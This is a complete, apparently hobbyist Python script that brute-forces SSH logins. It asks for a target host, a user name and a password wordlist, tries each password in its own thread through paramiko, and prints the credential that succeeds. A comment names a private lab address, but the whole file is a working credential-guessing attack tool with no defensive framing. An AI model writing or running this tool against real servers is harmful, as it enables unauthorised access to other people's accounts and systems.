import os
import paramiko
import sys
import termcolor
import threading
import time

# 192.168.153.128

stopFlag = 0


def sshConnect(password):
    global stopFlag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port=22, username=userName, password=password)
        stopFlag = 1
        print(termcolor.colored(('[+] Found Password: "' + password + '" For Account: "' + userName + '"'),
                                'green'))
    except:
        pass
    ssh.close()


host = input('[+] Enter Target Address: ')
userName = input('[+] Enter SSH user Name: ')
passwordFile = input('[+] Password File: ')
print('\n')

print(termcolor.colored(('**** Starting SSH Brute-forcing On ' + host + ' ****'), 'green'))

if not os.path.exists(passwordFile):
    print('That file/Path dose Not Exist')
    sys.exit(1)

with open(passwordFile) as file:
    for line in file.readlines():
        if stopFlag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=sshConnect, args=(password,))
        t.start()
        time.sleep(0.5)
